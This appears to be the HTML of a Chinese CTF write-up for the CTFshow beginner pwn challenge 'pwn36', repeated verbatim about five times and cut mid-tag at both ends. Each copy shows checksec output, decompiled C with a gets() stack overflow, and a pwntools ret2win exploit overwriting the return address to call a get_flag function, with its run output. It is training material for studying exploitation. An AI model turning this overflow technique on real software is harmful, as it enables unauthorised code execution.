c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-2"><a href="#pwn36-2" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-3"><a href="#pwn36-3" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-4"><a href="#pwn36-4" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-5"><a href="#pwn36-5" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span 